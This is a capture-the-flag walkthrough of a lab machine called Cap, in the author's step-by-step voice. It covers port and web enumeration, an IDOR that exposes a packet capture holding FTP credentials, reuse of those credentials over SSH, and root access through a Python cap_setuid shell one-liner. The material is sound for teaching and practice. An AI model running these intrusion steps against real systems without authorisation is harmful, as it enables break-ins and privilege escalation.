# Cap

## Enumeration

### Port Enumeration

First we can scan the IP using nmap to get open ports:

```bash
nmap -p- --min-rate 10000 -oA enum/scans/ports 10.129.1.53
```

### Results

```text
PORT   STATE SERVICE

21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

Then using nmap again, we can enumerate the open port services and any low hanging fruit.

```bash
nmap -p21,22,80 -sC -sV --min-rate 10000 -oA enum/scans/srv 10.129.1.53
```

### Results

```text
PORT   STATE SERVICE VERSION

21/tcp open  ftp     vsftpd 3.0.3

22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)

| ssh-hostkey:
| 3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
| 256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_ 256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)

80/tcp open  http    Gunicorn
|_http-title: Security Dashboard
|_http-server-header: gunicorn

Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### Nmap Findings

This output provides us with version details to research for known vulnerabilities or CVEs.

We also get the version of HTTP server in use which can help us begin to understand the tech stack.

---

### Basic FTP Enumeration

After some basic port enumeration, we can start enumerating the services themselves for more info.

Starting with FTP:

```bash
ftp anonymous@10.129.1.53
```

Testing anonymous access.

### Results

```text
530 Login incorrect.
```

### FTP Findings

Anonymous access isn't allowed.

Revisit with credentials...?

---

### Basic Web Enumeration

Now we can see what information we can find about the web service through banner grabbing.

```bash
whatweb 10.129.1.53:80
```

Banner grabbing using WhatWeb to try find more about the tech stack.

### Results

```text
http://10.129.1.53:80 [200 OK]

Bootstrap
Country[RESERVED][ZZ]
HTML5
HTTPServer[gunicorn]
IP[10.129.1.53]
JQuery[2.2.4]
Modernizr[2.8.3.min]
Script
Title[Security Dashboard]
X-UA-Compatible[ie=edge]
```

### WhatWeb Findings

This reveals the use of:

- JQuery 2.2.4
- Modernizr 2.8.3.min

This version of JQuery is vulnerable to multiple XSS attacks via DOM manipulation and Ajax.

- CVE-2020-11022
- CVE-2020-11023
- CVE-2015-9251

It is also vulnerable to a Prototype Pollution flaw:

- CVE-2019-11358

We can keep this in mind, but it doesn't seem like these will be usable in this case.

---

## In-depth Web Enumeration

First we can load the webpage.

We're met with a Security Dashboard:

- No credentials required for access
- `/ip`: Lists IP configurations
- `/netstat`: Lists active connections on local machine
- `/data/1`: Lists packets and has a downloadable PCAP file

---

From here while we poke around, we can run a directory scan.

```bash
gobuster dir -u http://10.129.1.53:80/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
```

### Results

```text
data      (Status: 302) [Size: 208] [--> http://10.129.1.53/]
ip        (Status: 200) [Size: 17453]
netstat   (Status: 200) [Size: 28646]
capture   (Status: 302) [Size: 220] [--> http://10.129.1.53/data/2]
```

### Gobuster Findings

Nothing we couldn't find through normal measures.

---

Poking around, when downloading the PCAP file from `/data/1` we get a file name:

```text
1.pcap
```

Upon inspecting this file using tcpdump, we don't see much.

```bash
tcpdump -r 1.pcap
```

### Results

```text
reading from file 1.pcap, link-type LINUX_SLL (Linux cooked v1), snapshot length 262144

22:18:38.645278 IP 10.10.14.57.33780 > 10.129.1.53.http: Flags [.], ack 2772256779, win 502, options [nop,nop,TS val 2430633526 ecr 1241873867], length 0
```

### Findings

This only shows us the single ACK packet from our host to the server.

However, the ID used in the URL directly maps to the filename...
If other files exist we may be able to retrieve them via IDOR.

```text
/data/2
```

This shows us different packet counts on the site.

Upon downloading the file we can see a different set of data.

```bash
tcpdump -r 2.pcap
```

### Results

```text
(same format as 1.pcap with 700 lines)
```

Clearly a different output.

Given computer logic, [0] generally maps to the first entry.
If our initial session gave `/data/1` and `/data/2` definitely exists, we should try `/data/0`.

```bash
tcpdump -r 0.pcap
```

### Results

```text
(same as last pcap + these lines)

01:12:54.084642 IP 192.168.196.1.54411 > 192.168.196.16.ftp: Flags [P.], seq 1:14, ack 21, win 4106, length 13: FTP: USER nathan

01:12:54.084668 IP 192.168.196.16.ftp > 192.168.196.1.54411: Flags [.], ack 14, win 502, length 0

01:12:54.084772 IP 192.168.196.16.ftp > 192.168.196.1.54411: Flags [P.], seq 21:55, ack 14, win 502, length 34: FTP: 331 Please specify the password.

01:12:54.125843 IP 192.168.196.1.54411 > 192.168.196.16.ftp: Flags [.], ack 55, win 4106, length 0

01:12:55.383140 IP 192.168.196.1.54411 > 192.168.196.16.ftp: Flags [P.], seq 14:36, ack 55, win 4106, length 22: FTP: PASS Buck3tH4TF0RM3!

01:12:55.383176 IP 192.168.196.16.ftp > 192.168.196.1.54411: Flags [.], ack 36, win 502, length 0

01:12:55.390529 IP 192.168.196.16.ftp > 192.168.196.1.54411: Flags [P.], seq 55:78, ack 36, win 502, length 23: FTP: 230 Login successful.
```

This details a successful FTP login with the user `nathan` and password `Buck3tH4TF0RM3!`.

So we should in theory now have FTP credentials:

```text
nathan:Buck3tH4TF0RM3!
```

### FTP Access

```bash
ftp nathan@10.129.1.53
```

Password:

```text
Buck3tH4TF0RM3!
```

### Results

```text
230 Login Successful.
```

### Findings

Now that we have access to the FTP server we can poke around for any useful files.

```bash
ls
```

### Results

```text
-r-------- 1 1001 1001 33 Aug 06 06:12 user.txt
```

```bash
get user.txt
```

### Findings

And here we find the user flag.

From here we can explore the file system within our permissions.

Nothing blatantly obvious is lying around, we could try for password reuse in SSH.

```bash
ssh nathan@10.129.1.53
```

Password:

```text
Buck3tH4TF0RM3!
```

### Results

```text
Authentication successful.
```

### Findings

This works.

From here we can do some more exploring.

```bash
id
```

### Results

```text
uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)
```

Nothing interesting.

```bash
find / -type f -perm -4000 -o -perm -2000 -ls 2>/dev/null
```

### Results

```text
Big list, nothing worth unusual.
```

Nothing interesting again.

```bash
getcap / -r 2>/dev/null
```

### Results

```text
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

This is interesting.

Using Python, which we can spawn a shell from, we have a setuid capability.

To test this we can run the following:

```bash
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

This will spawn a shell as root due to `os.setuid(0)` and having the `cap_setuid` capability.

### Results

```text
#
```

Seems like it worked.

```bash
whoami
```

### Results

```text
root
```

And in our home directory here... our root flag!
